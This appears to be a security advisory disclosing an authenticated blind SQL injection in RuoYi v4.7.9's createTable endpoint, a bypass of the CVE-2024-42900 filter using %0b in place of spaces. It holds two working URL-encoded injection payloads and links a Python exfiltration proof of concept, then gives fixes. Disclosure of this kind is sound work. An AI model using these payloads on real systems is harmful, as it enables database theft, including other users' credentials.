# Authenticated SQL Injection in RuoYi v4.7.9 (Bypass of CVE-2024-42900)
## Introduction
I discovered a Blind SQL Injection vulnerability in the `createTable` feature of RuoYi Framework v4.7.9. This allows an authenticated administrator to execute arbitrary SQL commands via the `sql` parameter. This is a bypass of CVE-2024-42900 fix as the SQL Injection filter in `filterKeyword` method is insufficient, the regex can be bypass by using `%0b` as the alternative character to spaces.

## Affected Version
Product: RuoYi Framework   
Version: ≤ 4.7.9   
Link: [[Ruoyi]](https://github.com/yangzongzhuan/RuoYi)   

## Vulnerability Analysis
The vulnerability was found in the `https://github.com/yangzongzhuan/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruoyi/common/utils/sql/SqlUtil.java` file as follow. The application relies on blacklist keywords to filter SQL Injection attacks, this approach is prone to bypasses. In this case, to fix CVE-2024-42900, the `/*` string was added to the blacklist, but the application still doesn't block the `%0b` character, so I can use it to trigger SQL Injection with `select%0b`.

```java
public class SqlUtil
{
    /**
     * 定义常用的 sql关键字
     */
    public static String SQL_REGEX = "and |extractvalue|updatexml|sleep|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |or |union |like |+|/*|user()";
    // Note the space after 'select '
    public static void filterKeyword(String value)
    {
        if (StringUtils.isEmpty(value))
        {
            return;
        }
        String[] sqlKeywords = StringUtils.split(SQL_REGEX, "\\|");
        for (String sqlKeyword : sqlKeywords)
        {
            if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) > -1)
            {
                throw new UtilException("参数存在SQL注入风险");
            }
        }
    }
}
```  
The regex select matches `select ` (followed by a space). It fails to match `select%0b`, which is a valid separator in SQL.
## Steps to reproduce Boolean SQL Injection
1. Log in as admin
2. Send createTable request (vulnerable endpoint `/tool/gen/createTable`)   
   a. Inject a TRUE query:
   ![true-query](https://github.com/user-attachments/assets/56d95c1b-409e-4bdc-8247-beabb2dadeae)
   ```
   sql=CREATE%20table%20j2iz96_666%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c18%2c1))%3d45%2c%201%2c%201%2f0)%3b
   ```
   b. Inject a FALSE query:
   ![false-query](https://github.com/user-attachments/assets/308fba92-18b8-44ce-befa-584e5265cdae)
   ```
   sql=CREATE%20table%20j2iz96_665%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c5%2c1))%3d44%2c%201%2c%201%2f0)%3b
   ```
**Caution**:  Need to change tablename in the CREATE query after every successful query.
3. With the boolean-based SQL Injection, data can be exfiltrated using the Python [[poc]](https://github.com/mrlihd/Ruoyi-4.7.9-SQL-Injection-PoC/blob/main/ruoyi-sqli-poc.py) in this repo   
**Usage**   
<img width="583" height="219" alt="poc-usage" src="https://github.com/user-attachments/assets/b70658a6-e3b8-4704-86d5-7ecfd263eebf" />   
**Exfiltrate DB version poc**   
<img width="815" height="479" alt="poc-db-version" src="https://github.com/user-attachments/assets/fa17493d-d07b-463f-a9ba-f10e09c93ced" />  

## Impact
An attacker with administrative privilege can dump the entire database, including other user credentials and system configurations.

## Advisory
1. Filter the `%0b` character.
2. Filter keyword `select` instead of `select ` (remove the ending space)
3. Update CMS to the 4.8.0 version of Ruoyi CMS

